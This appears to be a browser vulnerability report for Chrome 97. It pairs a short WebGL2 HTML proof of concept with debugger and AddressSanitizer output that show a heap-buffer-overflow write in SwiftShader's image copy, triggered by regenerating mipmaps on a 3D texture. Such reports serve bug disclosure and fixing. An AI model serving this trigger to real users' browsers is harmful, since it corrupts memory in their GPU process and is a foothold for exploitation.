@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<body>
+<canvas id="canvas1" width="512" height="512"></canvas>
+
+<script>
+async function genWebGL2(){
+
+var canvas = document.getElementById('canvas1');
+var gl1 = canvas1.getContext('webgl2');
+
+var texture1 = gl1.createTexture();
+gl1.bindTexture(gl1.TEXTURE_3D, texture1);
+
+imgData = new Uint8Array(163840);
+gl1.texImage3D(gl1.TEXTURE_3D, 0, gl1.RGB8, 16, 16, 16, 0, gl1.RGB, gl1.UNSIGNED_BYTE, imgData);
+gl1.generateMipmap(gl1.TEXTURE_3D);
+
+imgData = new Uint8Array(163840);
+gl1.texParameterf(gl1.TEXTURE_3D,gl1.TEXTURE_BASE_LEVEL,3);
+gl1.texImage3D(gl1.TEXTURE_3D, 0, gl1.RGB8, 32, 32, 32, 0, gl1.RGB, gl1.UNSIGNED_BYTE, imgData);
+gl1.generateMipmap(gl1.TEXTURE_3D);
+}
+
+genWebGL2().then(() => location = 'nope.html');
+</script>
+</body>
+</html>
+
+Tested on Windows 11  (Chrome 97.0.4692.71) with --disable-gpu 
+Asan log from a linux machine is also attached.
+
+2:144> r
+rax=000001fd80e92090 rbx=000001fd80fdbfb0 rcx=000001fd80fdc010
+rdx=ffffffffffeb6060 rsi=0000000000000080 rdi=0000000000000002
+rip=00007ffaf842c140 rsp=0000004a5d3ff0e8 rbp=000001fd80e92010
+ r8=0000000000000070  r9=0000000000000002 r10=000001fd80e92010
+r11=000001fd80fdbfb0 r12=000001fd80fdb830 r13=000001fd80e91110
+r14=0000000000000080 r15=0000000000000040
+iopl=0         nv up ei pl nz na pe nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
+vk_swiftshader!memcpy+0x260:
+00007ffa`f842c140 0f1141f0        movups  xmmword ptr [rcx-10h],xmm0 ds:000001fd`80fdc000=000000000000000000010102464c457f
+
+2:144> k
+ # Child-SP          RetAddr               Call Site
+00 0000004a`5d3ff0e8 00007ffa`f8186337     vk_swiftshader!memcpy+0x260 [d:\A01\_work\6\s\src\vctools\crt\vcruntime\src\string\amd64\memcpy.asm @ 478] 
+01 0000004a`5d3ff0f0 00007ffa`f81757f5     vk_swiftshader!vk::Image::copy+0x5c7 [C:\b\s\w\ir\cache\builder\src\third_party\swiftshader\src\Vulkan\VkImage.cpp @ 660] 
+02 0000004a`5d3ff210 00007ffa`f818f173     vk_swiftshader!vk::CommandBuffer::submit+0x35 [C:\b\s\w\ir\cache\builder\src\third_party\swiftshader\src\Vulkan\VkCommandBuffer.cpp @ 1731] 
+03 0000004a`5d3ff260 00007ffa`f818eb81     vk_swiftshader!vk::Queue::submitQueue+0x1e3 [C:\b\s\w\ir\cache\builder\src\third_party\swiftshader\src\Vulkan\VkQueue.cpp @ 234] 
+04 0000004a`5d3ff630 00007ffa`f818fb11     vk_swiftshader!vk::Queue::taskLoop+0xb1 [C:\b\s\w\ir\cache\builder\src\third_party\swiftshader\src\Vulkan\VkQueue.cpp @ 294] 
+05 (Inline Function) --------`--------     vk_swiftshader!std::__1::__invoke+0x12 [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\type_traits @ 3897] 
+06 (Inline Function) --------`--------     vk_swiftshader!std::__1::__thread_execute+0x12 [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\thread @ 280] 
+07 0000004a`5d3ff6d0 00007ffa`f8433cd0     vk_swiftshader!std::__1::__thread_proxy<std::__1::tuple<std::__1::unique_ptr<std::__1::__thread_struct,std::__1::default_delete<std::__1::__thread_struct> >,void (vk::Queue::*)(marl::Scheduler *),vk::Queue *,marl::Scheduler *> >+0x31 [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\thread @ 293] 
+08 0000004a`5d3ff710 00007ffb`605a54e0     vk_swiftshader!thread_start<unsigned int (__cdecl*)(void *),1>+0x50 [C:\b\s\w\ir\cache\builder\src\out\Release_x64\minkernel\crts\ucrt\src\appcrt\startup\thread.cpp @ 97] 
+09 0000004a`5d3ff740 00007ffb`611c485b     KERNEL32!BaseThreadInitThunk+0x10
+0a 0000004a`5d3ff770 00000000`00000000     ntdll!RtlUserThreadStart+0x2b
+
+
+
+
+==143529==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x629000167d38 at pc 0x55e4a1e50e9a bp 0x7f1b24a8c3f0 sp 0x7f1b24a8bbc0
+WRITE of size 128 at 0x629000167d38 thread T10
+    #0 0x55e4a1e50e99 in __asan_memcpy /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cpp:22:3
+    #1 0x7f1b2f382629 in vk::Image::copy(vk::Buffer*, VkBufferImageCopy2KHR const&, bool) third_party/swiftshader/src/Vulkan/VkImage.cpp:659:6
+    #2 0x7f1b2f356466 in vk::CommandBuffer::submit(vk::CommandBuffer::ExecutionState&) third_party/swiftshader/src/Vulkan/VkCommandBuffer.cpp:1757:12
+    #3 0x7f1b2f39e85b in vk::Queue::submitQueue(vk::Queue::Task const&) third_party/swiftshader/src/Vulkan/VkQueue.cpp:236:42
+    #4 0x7f1b2f39d82e in vk::Queue::taskLoop(marl::Scheduler*) third_party/swiftshader/src/Vulkan/VkQueue.cpp:288:4
+    #5 0x7f1b2f3a0368 in __invoke<void (vk::Queue::*)(marl::Scheduler *), vk::Queue *, marl::Scheduler *, void> buildtools/third_party/libc++/trunk/include/type_traits:3897:1
+    #6 0x7f1b2f3a0368 in __thread_execute<std::__1::unique_ptr<std::__1::__thread_struct, std::__1::default_delete<std::__1::__thread_struct> >, void (vk::Queue::*)(marl::Scheduler *), vk::Queue *, marl::Scheduler *, 2UL, 3UL> buildtools/third_party/libc++/trunk/include/thread:280:5
+    #7 0x7f1b2f3a0368 in void* std::__1::__thread_proxy<std::__1::tuple<std::__1::unique_ptr<std::__1::__thread_struct, std::__1::default_delete<std::__1::__thread_struct> >, void (vk::Queue::*)(marl::Scheduler*), vk::Queue*, marl::Scheduler*> >(void*) buildtools/third_party/libc++/trunk/include/thread:291:5
+    #8 0x7f1b3aa03608 in start_thread /build/glibc-eX1tMB/glibc-2.31/nptl/pthread_create.c:477:8
+
+0x629000167d38 is located 0 bytes to the right of 19256-byte region [0x629000163200,0x629000167d38)
+allocated by thread T0 (chrome) here:
+    #0 0x55e4a1e51a7e in malloc /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_malloc_linux.cpp:69:3
+    #1 0x7f1b2f69a8bb in allocate third_party/swiftshader/src/System/Memory.cpp:81:42
+    #2 0x7f1b2f69a8bb in sw::allocateZeroOrPoison(unsigned long, unsigned long) third_party/swiftshader/src/System/Memory.cpp:116:9
+    #3 0x7f1b2f371016 in vk::DeviceMemory::allocateBuffer() third_party/swiftshader/src/Vulkan/VkDeviceMemory.cpp:323:11
+    #4 0x7f1b2f36fb77 in allocate third_party/swiftshader/src/Vulkan/VkDeviceMemory.cpp:261:12
+    #5 0x7f1b2f36fb77 in vk::DeviceMemory::Allocate(VkAllocationCallbacks const*, VkMemoryAllocateInfo const*, VkNonDispatchableHandle<VkDeviceMemory_T*>*, vk::Device*) third_party/swiftshader/src/Vulkan/VkDeviceMemory.cpp:103:29
+    #6 0x7f1b2f3ba73f in vkAllocateMemory third_party/swiftshader/src/Vulkan/libVulkan.cpp:1091:20
+    #7 0x7f1b31b2725b in allocate third_party/angle/src/libANGLE/renderer/vulkan/vk_wrapper.h:1308:12
+    #8 0x7f1b31b2725b in rx::(anonymous namespace)::FindAndAllocateCompatibleMemory(rx::vk::Context*, rx::vk::MemoryProperties const&, unsigned int, unsigned int*, VkMemoryRequirements const&, void const*, rx::vk::DeviceMemory*) third_party/angle/src/libANGLE/renderer/vulkan/vk_utils.cpp:103:5
+    #9 0x7f1b31b22635 in AllocateAndBindBufferOrImageMemory<rx::vk::Image> third_party/angle/src/libANGLE/renderer/vulkan/vk_utils.cpp:144:5
+    #10 0x7f1b31b22635 in AllocateBufferOrImageMemory<rx::vk::Image> third_party/angle/src/libANGLE/renderer/vulkan/vk_utils.cpp:201:5
+    #11 0x7f1b31b22635 in rx::vk::AllocateImageMemory(rx::vk::Context*, unsigned int, unsigned int*, void const*, rx::vk::Image*, rx::vk::DeviceMemory*, unsigned long*) third_party/angle/src/libANGLE/renderer/vulkan/vk_utils.cpp:719:12
+    #12 0x7f1b31ae42ee in rx::vk::ImageHelper::initMemory(rx::vk::Context*, bool, rx::vk::MemoryProperties const&, unsigned int) third_party/angle/src/libANGLE/renderer/vulkan/vk_helpers.cpp:4799:5
+    #13 0x7f1b31a115a0 in rx::TextureVk::initImage(rx::ContextVk*, angle::FormatID, angle::FormatID, rx::ImageMipLevels) third_party/angle/src/libANGLE/renderer/vulkan/TextureVk.cpp:2994:5
+    #14 0x7f1b31a08050 in rx::TextureVk::ensureImageInitialized(rx::ContextVk*, rx::ImageMipLevels) third_party/angle/src/libANGLE/renderer/vulkan/TextureVk.cpp:2417:9
+    #15 0x7f1b31a1bf19 in rx::TextureVk::syncState(gl::Context const*, angle::BitSetT<24ul, unsigned long, unsigned long> const&, gl::Command) third_party/angle/src/libANGLE/renderer/vulkan/TextureVk.cpp:2711:5
+    #16 0x7f1b314c7333 in syncState third_party/angle/src/libANGLE/Texture.cpp:2101:5
+    #17 0x7f1b314c7333 in gl::Texture::generateMipmap(gl::Context*) third_party/angle/src/libANGLE/Texture.cpp:1748:5
+    #18 0x7f1b31265c5f in GL_GenerateMipmap third_party/angle/src/libGLESv2/entry_points_gles_2_0_autogen.cpp:1445:22
+    #19 0x55e4b5a101d7 in gpu::gles2::GLES2DecoderPassthroughImpl::DoGenerateMipmap(unsigned int) gpu/command_buffer/service/gles2_cmd_decoder_passthrough_doers.cc:1454:10
+    #20 0x55e4b59da45f in gpu::error::Error gpu::gles2::GLES2DecoderPassthroughImpl::DoCommandsImpl<false>(unsigned int, void const volatile*, int, int*) gpu/command_buffer/service/gles2_cmd_decoder_passthrough.cc:859:20
+    #21 0x55e4b5e62a85 in gpu::CommandBufferService::Flush(int, gpu::AsyncAPIInterface*) gpu/command_buffer/service/command_buffer_service.cc:70:18
+    #22 0x55e4b5e562df in gpu::CommandBufferStub::OnAsyncFlush(int, unsigned int, std::__1::vector<gpu::SyncToken, std::__1::allocator<gpu::SyncToken> > const&) gpu/ipc/service/command_buffer_stub.cc:499:22
+    #23 0x55e4b5e55796 in gpu::CommandBufferStub::ExecuteDeferredRequest(gpu::mojom::DeferredCommandBufferRequestParams&) gpu/ipc/service/command_buffer_stub.cc:151:7
+    #24 0x55e4b5e69706 in gpu::GpuChannel::ExecuteDeferredRequest(mojo::StructPtr<gpu::mojom::DeferredRequestParams>) gpu/ipc/service/gpu_channel.cc:667:13
+    #25 0x55e4b5e768c6 in void base::internal::FunctorTraits<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>), void>::Invoke<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>), base::WeakPtr<gpu::GpuChannel>, mojo::StructPtr<gpu::mojom::DeferredRequestParams> >(void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&) base/bind_internal.h:535:12
+    #26 0x55e4b483f57c in Run base/callback.h:142:12
+    #27 0x55e4b483f57c in gpu::Scheduler::RunNextTask() gpu/command_buffer/service/scheduler.cc:684:26
+    #28 0x55e4b019f913 in Run base/callback.h:142:12
+    #29 0x55e4b019f913 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/task/common/task_annotator.cc:135:32
+    #30 0x55e4b01df3d3 in RunTask<(lambda at ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:358:29)> base/task/common/task_annotator.h:74:5
+    #31 0x55e4b01df3d3 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::sequence_manager::LazyNow*) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:356:21
+    #32 0x55e4b01debe7 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:261:30
+    #33 0x55e4b01dffa1 in non-virtual thunk to base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc
+    #34 0x55e4b0098ff9 in HandleDispatch base/message_loop/message_pump_glib.cc:375:46
+    #35 0x55e4b0098ff9 in base::(anonymous namespace)::WorkSourceDispatch(_GSource*, int (*)(void*), void*) base/message_loop/message_pump_glib.cc:125:43
+    #36 0x7f1b3a8ab17c in g_main_context_dispatch (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x5217c) (BuildId: 2c1d2f9d4a08c71a36797aeb246ab7ae377934ea)
+
+Thread T10 created by T0 (chrome) here:
+    #0 0x55e4a1e3b17c in pthread_create /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_interceptors.cpp:208:3
+    #1 0x7f1b2f39db16 in __libcpp_thread_create buildtools/third_party/libc++/trunk/include/__threading_support:513:10
+    #2 0x7f1b2f39db16 in std::__1::thread::thread<void (vk::Queue::*)(marl::Scheduler*), vk::Queue*, marl::Scheduler*&, void>(void (vk::Queue::*&&)(marl::Scheduler*), vk::Queue*&&, marl::Scheduler*&) buildtools/third_party/libc++/trunk/include/thread:307:16
+    #3 0x7f1b2f39d58d in vk::Queue::Queue(vk::Device*, marl::Scheduler*) third_party/swiftshader/src/Vulkan/VkQueue.cpp:170:16
+    #4 0x7f1b2f3657e4 in vk::Device::Device(VkDeviceCreateInfo const*, void*, vk::PhysicalDevice*, VkPhysicalDeviceFeatures const*, std::__1::shared_ptr<marl::Scheduler> const&) third_party/swiftshader/src/Vulkan/VkDevice.cpp:138:26
+    #5 0x7f1b2f3b9e68 in DispatchableObject<const VkDeviceCreateInfo *, void *, vk::PhysicalDevice *, const VkPhysicalDeviceFeatures *, std::__1::shared_ptr<marl::Scheduler> > third_party/swiftshader/src/Vulkan/VkObject.hpp:127:8
+    #6 0x7f1b2f3b9e68 in Create<vk::DispatchableObject<vk::Device, VkDevice_T *>, VkDevice_T *, VkDeviceCreateInfo, vk::PhysicalDevice *, const VkPhysicalDeviceFeatures *, std::__1::shared_ptr<marl::Scheduler> > third_party/swiftshader/src/Vulkan/VkObject.hpp:65:34
+    #7 0x7f1b2f3b9e68 in VkResult vk::DispatchableObject<vk::Device, VkDevice_T*>::Create<VkDeviceCreateInfo, vk::PhysicalDevice*, VkPhysicalDeviceFeatures const*, std::__1::shared_ptr<marl::Scheduler> >(VkAllocationCallbacks const*, VkDeviceCreateInfo const*, VkDevice_T**, vk::PhysicalDevice*, VkPhysicalDeviceFeatures const*, std::__1::shared_ptr<marl::Scheduler>) third_party/swiftshader/src/Vulkan/VkObject.hpp:147:10
+    #8 0x7f1b2f3b9877 in vkCreateDevice third_party/swiftshader/src/Vulkan/libVulkan.cpp:981:9
+    #9 0x7f1b30745ad5 in terminator_CreateDevice third_party/vulkan-deps/vulkan-loader/src/loader/loader.c:5901:11
+    #10 0x7f1b30740313 in loader_create_device_chain third_party/vulkan-deps/vulkan-loader/src/loader/loader.c:5196:15
+    #11 0x7f1b3073eb97 in loader_layer_create_device third_party/vulkan-deps/vulkan-loader/src/loader/loader.c:4709:11
+    #12 0x7f1b30755877 in vkCreateDevice third_party/vulkan-deps/vulkan-loader/src/loader/trampoline.c:900:20
+    #13 0x7f1b319bf392 in rx::RendererVk::initializeDevice(rx::DisplayVk*, unsigned int) third_party/angle/src/libANGLE/renderer/vulkan/RendererVk.cpp:2216:5
+    #14 0x7f1b319b7976 in rx::RendererVk::initialize(rx::DisplayVk*, egl::Display*, char const*, char const*) third_party/angle/src/libANGLE/renderer/vulkan/RendererVk.cpp:1450:9
+    #15 0x7f1b3195cd38 in rx::DisplayVk::initialize(egl::Display*) third_party/angle/src/libANGLE/renderer/vulkan/DisplayVk.cpp:46:39
+    #16 0x7f1b31b2e2a9 in rx::DisplayVkXcb::initialize(egl::Display*) third_party/angle/src/libANGLE/renderer/vulkan/linux/xcb/DisplayVkXcb.cpp:65:23
+    #17 0x7f1b31364f14 in egl::Display::initialize() third_party/angle/src/libANGLE/Display.cpp:940:36
+    #18 0x7f1b31245d19 in egl::Initialize(egl::Thread*, egl::Display*, int*, int*) third_party/angle/src/libGLESv2/egl_stubs.cpp:448:5
+    #19 0x7f1b3124db64 in EGL_Initialize third_party/angle/src/libGLESv2/entry_points_egl_autogen.cpp:311:12
+    #20 0x55e4b394e69f in gl::GLSurfaceEGL::InitializeDisplay(gl::EGLDisplayPlatform) ui/gl/gl_surface_egl.cc:1427:10
+    #21 0x55e4b394c072 in gl::GLSurfaceEGL::InitializeOneOff(gl::EGLDisplayPlatform) ui/gl/gl_surface_egl.cc:988:3
+    #22 0x55e4a42466fd in ui::GLOzoneEGL::InitializeGLOneOffPlatform() ui/ozone/common/gl_ozone_egl.cc:19:8
+    #23 0x55e4b3c000c8 in gl::init::InitializeGLOneOffPlatformImplementation(bool, bool, bool) ui/gl/init/gl_factory.cc:246:22
+    #24 0x55e4b3bffbc7 in gl::init::(anonymous namespace)::InitializeGLOneOffPlatformHelper(bool) ui/gl/init/gl_factory.cc:167:10
+    #25 0x55e4b3bffe70 in gl::init::InitializeGLNoExtensionsOneOff(bool) ui/gl/init/gl_factory.cc:202:10
+    #26 0x55e4b5ec9ac1 in gpu::GpuInit::InitializeAndStartSandbox(base::CommandLine*, gpu::GpuPreferences const&) gpu/ipc/service/gpu_init.cc:402:11
+    #27 0x55e4bc2597d3 in content::GpuMain(content::MainFunctionParams) content/gpu/gpu_main.cc:321:39
+    #28 0x55e4aef62d20 in content::RunZygote(content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:615:14
+    #29 0x55e4aef6587e in content::RunOtherNamedProcessTypeMain(std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > const&, content::MainFunctionParams, content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:687:12
+    #30 0x55e4aef67707 in content::ContentMainRunnerImpl::Run() content/app/content_main_runner_impl.cc:1028:10
+    #31 0x55e4aef6024c in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*) content/app/content_main.cc:398:36
+    #32 0x55e4aef61e74 in content::ContentMain(content::ContentMainParams) content/app/content_main.cc:426:10
+    #33 0x55e4a1e863fe in ChromeMain chrome/app/chrome_main.cc:177:12
+    #34 0x7f1b393650b2 in __libc_start_main /build/glibc-eX1tMB/glibc-2.31/csu/../csu/libc-start.c:308:16
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cpp:22:3 in __asan_memcpy
+Shadow bytes around the buggy address:
+  0x0c5280024f50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0c5280024f60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0c5280024f70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0c5280024f80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0c5280024f90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x0c5280024fa0: 00 00 00 00 00 00 00[fa]fa fa fa fa fa fa fa fa
+  0x0c5280024fb0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c5280024fc0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c5280024fd0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c5280024fe0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c5280024ff0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==143529==ABORTING
